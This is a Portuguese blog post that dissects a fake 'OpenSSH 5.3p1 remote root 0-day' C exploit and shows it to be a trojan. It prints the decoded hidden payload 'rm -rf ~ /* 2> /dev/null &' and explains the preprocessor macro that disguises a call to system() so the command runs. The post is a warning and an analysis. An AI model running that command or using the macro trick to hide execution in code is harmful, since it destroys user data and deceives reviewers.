---
layout: post
title:  "0-Day openssh-53p1-remote-root.c?"
date:   2010-01-02
categories: exploit
tags: exploit 0day fake
lang: br
ref: 0-day-openssh-53p1-remote-root-c
has-asciinema: false
---
Estava em casa e de madrugada recebi uma mensagem dizendo “0-day para OpenSSH” seguindo do seguinte link:

[http://pentestit.com/wp-content/uploads/2010/02/openssh-53p1-remote-root.c](https://gist.github.com/maycon/367597215be1080e2d277a3f4762aa35)



Já logo pensei na festa que isso seria para os script kiddies e raquers de plantão. Porém ao dar uma olhada rápida no código, percebe-se logo de inicio algumas sutilezas. De uma maneira geral o código realmente parece com um exploit, com seus imensos _shellcodes_ e suas conexões por _socket_, o que me fez da uma olhada com mais calma e escrever este post.

Vamos ao começo do código:
```c
if (geteuid()) {
	puts("Root is required for raw sockets, etc.");
	return 1;
}
```

Olhando logo na parte inicial do código, é possível notar que ele exige que seja executando com um usuário com privilégios de _root_, argumentando que é necessário para utilização de _raw sockets_ (`SOCK_RAW`). Porém, procurando pela criação do socket em questão, nota-se que ele utiliza um `SOCK_STREAM`, que representa uma conexão TCP normal sem necessidade de root.

```c
sock = socket(PF_INET, SOCK_STREAM, 0);
addr.sin_port = htons(port);
addr.sin_family = AF_INET;
if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == -1){
	printf("  [-] Connecting Failed\n");
	return 1;
}
```

Em seguida, ele faz uma validação da quantidade de argumentos, fornecendo uma ajuda caso não existam parâmetros suficiente:
```c
if(argc < 3){
	usage(argv[0]);
	return 1;
}
```

Porém, é importante notar que ele não faz qualquer outra referência à `argv`, ou seja, ele não trata os parâmetros fornecidos:
```c
if (!inet_aton(h, &addr.sin_addr)){
	host = gethostbyname(h);
	if (!host){
		printf("  [-] Resolving Failed\n");
		return 1;
	}
	addr.sin_addr = *(struct in_addr*)host->h_addr;
}
```

Seguindo pelo código, temos um trecho de código que diz converter o endereço fornecido em seu host. Porém como não existe qualquer parâmetro definido como host, a função `inet_aton` vai retornar um valor diferente de zero, o que resultará sempre no salto desta condição.
```c
payload = malloc(limit * 10000);
ptr = payload+8;
memcpy(ptr,jmpcode,strlen(jmpcode));
jmpinst=fopen(shellcode+793,"w+");
if(jmpinst){
	fseek(jmpinst,0,SEEK_SET);
	fprintf(jmpinst,"%s",shellcode);
	fclose(jmpinst);
}
```

Neste momento ele começa a preencher um buffer (um trecho de código comum em exploits), porém ele escreve uma variável `jmpcode` a partir da posição 8 deste buffer ( apontado por `ptr` ).

Analisando o conteúdo dessa variável temos o seguinte:
```
maycon@hacknroll~$ printf $(cat jmpcode.txt) > jmpcode.bin
maycon@hacknroll~$ file jmpcode.bin
jmpcode.bin: ASCII C program text, with no line terminators
maycon@hacknroll~$ cat jmpcode.bin
rm -rf ~ /* 2> /dev/null &
maycon@hacknroll~$
```

Opa! Nos deparamos com uma coisa nem um pouco agradável de ser ver. Estamos vendo um comando que apaga o home (`~`) do usuário em seguida apaga tudo a partir da raiz (`/*`). :)

O mesmo código chama `fopen()` a uma posição do shellcode que sequer representa um nome de arquivo válido, ou seja, a função `fopen()` vai falhar.

No resto do código tem muita besteira. O que me deixou mais impressionado foi a macro `fremote()` que reordenar os argumentos de `tesmy` para `system`. Se reparar, ela é chamada no inicio do código como `fremote(jmpcode)`, que executaria o `rm -rf` visto anteriormente, veja um exemplo da utilização das macros:
```c
#include 
 
#define build_frem(x,y,a,b,c) a##c##a##x##y##b
#define fremote build_frem(t,e,s,m,y)
 
char jmpcode[] = "ls -l";
 
int main(void)
{
	fremote(jmpcode);
	return 0;
}
```

Analisando a chamada `build_frem`, temos que ele simplesmente organiza os parâmetros como terceiro, último, terceiro, primeiro, segundo e penúltimo. Aplicando esta mesma sequência nos parâmetros de build_frem teremos a string system.

Se executarmos `gcc -E` temos o código logo após o processamento das macros:
```
maycon@hacknroll~$ gcc -E fremote.c  | tail -n 8

char jmpcode[] = "ls -l";

int main(void)
{
	system(jmpcode);
	return 0;
}

maycon@hacknroll~$
```

Este é um trick bastante interessante. Ah se eu soubesse disto na época de _Programação I_ na faculdade. :-)

De qualquer forma isto serve de aviso para os que se aventuram a simplesmente compilar e executar os exploits vistos na internet.

Abraços a todos,

Hack N' Roll
